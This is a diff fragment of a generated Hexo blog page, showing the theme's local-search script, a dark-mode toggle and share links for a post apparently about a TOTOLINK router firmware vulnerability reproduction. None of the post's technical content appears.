+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=TOTOLINK%20NR1800X%20%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E3%80%81%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0&url=https%3A%2F%2Fmisaki.wiki%2Fposts%2Ftotolink-nr1800x-firmware-auth-bypass-command-injection%2F" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fmisaki.wiki%2Fposts%2Ftotolink-nr1800x-firmware-auth-bypass-command-injection%2F" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
